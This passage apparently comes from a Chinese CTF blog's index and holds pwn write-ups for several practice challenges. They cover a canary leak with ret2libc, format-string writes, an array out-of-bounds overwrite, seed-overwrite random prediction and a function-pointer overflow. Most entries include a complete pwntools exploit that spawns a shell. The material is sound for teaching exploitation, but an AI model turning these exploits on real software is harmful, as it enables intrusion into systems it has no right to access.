punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token comment">#通过覆盖掉\x00来使得puts泄漏出canary</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将末尾的0xa替换回来</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary value : 0x%x"</span> <span class="token operator">%</span> canary<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>payload_1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span>  \ p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token comment">#利用puts函数输出puts函数的地址</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>put_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts address : 0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>put_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> put_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#计算基地址</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> execve_addrsh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token comment">#跳转到getshell</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-string</title>
      <link href="/ctf-pwn/6d40db96.html"/>
      <url>/ctf-pwn/6d40db96.html</url>
      
        <content type="html"><![CDATA[<p><em>最后修改于2023年9月4日</em></p><p>main函数中直接打印了v4的地址<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715234012.png" style="zoom:80%;" /><br>在函数sub_400BB9中，存在格式化字符串漏洞<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715234740.png" style="zoom:80%;" /></p><p>在函数sub_400CA6中，*a1其实就是最开始的v4，如果v41==v42 ,就会执行输入的字节码。mmap函数开辟内存空间后将指针传递给v1，</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">((void (__fastcall *)(_QWORD))v1)(0LL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这段代码将v1转换为一个&#x3D;&#x3D;函数指针&#x3D;&#x3D;</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715234931.png" style="zoom:80%;" /><p>综上，只要是v41 &#x3D; v42 即可执行shellcode从而getshell。<br>在<code>sub_400BB9</code>函数中存在格式化字符串漏洞，且在最开始会打印出v4的地址，因此在sub_400BB9中<code>Give me an address</code>时，可以输入v4的地址，然后通过格式化字符串漏洞进行修改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment"># from ctypes import*</span><span class="token comment"># libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("61.147.171.105", 59440)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./1d3c852354df4609bf8e56fe8e9df316'</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x804855A</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">,</span> <span class="token string">b"east"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">85</span> <span class="token operator">+</span> <span class="token string">b'%7$n'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment"># shellcode =  '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"USE YOU SPELL"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment"># gdb.attach(sh)</span><span class="token comment"># pause()</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-stack2</title>
      <link href="/ctf-pwn/440df70f.html"/>
      <url>/ctf-pwn/440df70f.html</url>
      
        <content type="html"><![CDATA[<p><em>完成于2023年8月2日</em></p><p><em>最后修改于2023年9月4日</em></p><p>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802153857.png" style="zoom:80%;" /></p><p>有栈保护 </p><p>程序主体是一个计算平均数的计算器，存在漏洞的点是数组越界，没有对数组下标进行限制，所有可以对任意地址进行修改<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802155519.png" style="zoom:80%;" /></p><p>该程序中存在<code>system(&quot;/bin/bash)</code>，所以可以利用数组越界去修改函数返回地址，来getshell。<br>只要得到<code>main</code>函数的返回地址在栈中与数组的偏移就可以进行修改。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802160711.png" style="zoom:80%;" /><br>在ida中查看main函数的stack，数组距离main返回地址的偏移为0x70+4 -&gt; 0x74(&#x3D;&#x3D;好像和canary有关&#x3D;&#x3D;)<br>在调试过程中，确定main函数的返回地址与数据首地址的偏移。</p><p>确定偏移后，就可以利用了，但是在本题中无法直接使用<code>system(&#39;/bin/sh&#39;)</code>,需要重新构造一下。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230803145720.png" style="zoom:80%;" /><br>可以把<code>/bin/bash</code>截断，将<code>sh</code>传给system利用<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230803153602.png" style="zoom:80%;" /><br><code>sh</code>从87开始<br><code>system</code> 可以直接利用<code>call system</code>的地址，也就是<code>0x080485B4</code><br>完整exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process("./stack2")</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"5. exit"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"which number to change"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-guess_num</title>
      <link href="/ctf-pwn/a1902526.html"/>
      <url>/ctf-pwn/a1902526.html</url>
      
        <content type="html"><![CDATA[<p>通过IDA打开附件后，其中有srand随机数函数，当随机数种子变时，无论生成多少次随机数，所产生的随机数序列都是相同的。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714100108.png" style="zoom:50%;" /></p><p>使用gets()函数进行处理，可以进行溢出，且输入和seed在栈空间中是连续的，在输入时，覆盖到seed[0] 即可</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714141012.png" style="zoom:50%;" />gets获取到的输入与seed数组在栈中是连续的，gets长度为32，因此构造payload为<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中“1000”，是设置的随机数种子，在输入过程中，“1000”是按字符形式读取的，所以在生成时该数为“0x30303031”</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdlib></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0x30303031u</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span>number<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//在Linux下进行编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成随机数：6235463161</p><p>python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment">#sh = remote("61.147.171.105", 59395)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过ctypes库来调用c函数生成随机数</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-forgot</title>
      <link href="/ctf-pwn/be50b3b8.html"/>
      <url>/ctf-pwn/be50b3b8.html</url>
      
        <content type="html"><![CDATA[<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102348.png" style="zoom:50%;" />防护只开了不可执行。运行该程序，是一个邮件注册的东西。程序大致逻辑就是输入一个用户名，然后输入一个邮箱账号，然后对邮箱账号进行一个规范性检查，通过一个内嵌switch-case的循环实现，邮箱账号的每一个进行匹配检查<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102750.png" style="zoom:50%;" /><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102812.png" style="zoom:50%;" />在main函数结尾处有一个函数指针，执行v3数组里的函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102933.png" style="zoom:50%;" />v3数组里面是相应的puts输出函数。在该程序中存在有现成的system  cat flag的函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720103051.png" style="zoom:50%;" />又存在scanf函数，存在溢出点，且v3与输入的邮箱账号在同一个栈中，考虑通过修改v3数组，使其指向spawn函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720103322.png" style="zoom:80%;" />input_name的长度为32，用32个“a”填充后，从for循环中跳出来后flag_value的值为2，对应到最后的函数指针上，会执行v3数组中第二个元素，也就是说spawn函数的地址要填充到v3的第二个元素处，v3每个元素的类型为dword，因此还需要填充4个字符，在填充spawn的地址构造的payload为`payload = b'a' * 36 + p32(spawn_addr`完整exp如下：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn_addr <span class="token operator">=</span> <span class="token number">0x80486cc</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pwn_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What is your name?\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-dic_game</title>
      <link href="/ctf-pwn/7551b35e.html"/>
      <url>/ctf-pwn/7551b35e.html</url>
      
        <content type="html"><![CDATA[<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718102541.png"  style="zoom:50%;" /><p>关于elf文件结构<br>.got全局偏移表<br>.plt程序链接表</p><p>#覆盖随机数种子</p><p>又是一个猜数游戏，checksec如下<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141443.png"  style="zoom:50%;" /></p><p>存在溢出函数read，用time来作为当前的随机数种子<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141653.png"  style="zoom:50%;" /><br>在sub_556DF3600A20中，v1为输入的数，v2为随机数，如果相等则win，返回1<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142043.png" style="zoom:50%;" /></p><p>当50次都输入正确是，进入sub_556DF3600B28函数，该函数将输出flag<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142153.png"  style="zoom:50%;" /></p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142228.png"  style="zoom:50%;" /><p>因此，只要能知道随机数种子就可以预测每一次的数字，从而获得flag。<br>存在的溢出点read函数则可以帮助实现。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142424.png"  style="zoom:50%;" /><br>buf的大小为55，而read分配的空间为0x50，也就是80，buf在栈中到seed的偏移为64。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142544.png"  style="zoom:50%;" /><br> 通过输入name进行溢出覆盖到seed，使得seed可控，从而可预测出随机数</p><p>利用exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Welcome, let me know your name:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me the point(1~6):"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-guess_num]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-cgpwn2</title>
      <link href="/ctf-pwn/ee66d7d5.html"/>
      <url>/ctf-pwn/ee66d7d5.html</url>
      
        <content type="html"><![CDATA[<p>没有开启任何防护<br>存在system函数，存在gets函数可溢出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715151040.png" style="zoom:50%;" /></p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715151024.png" style="zoom:50%;" />要getshell的话需要构造“/bin/sh”参数，但是本身并没有这个字符串，因此可以在输入name时，输入“/bin/sh"，然后在构造payload时将”/bin/sh"的地址写入<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x804855A</span>name <span class="token operator">=</span> <span class="token string">b'/bin/sh'</span>name_addr <span class="token operator">=</span> <span class="token number">0x804A080</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please tell me your name'</span><span class="token punctuation">,</span> name <span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'hello,you can leave some message here:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-string]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-CGFsb</title>
      <link href="/ctf-pwn/4b131921.html"/>
      <url>/ctf-pwn/4b131921.html</url>
      
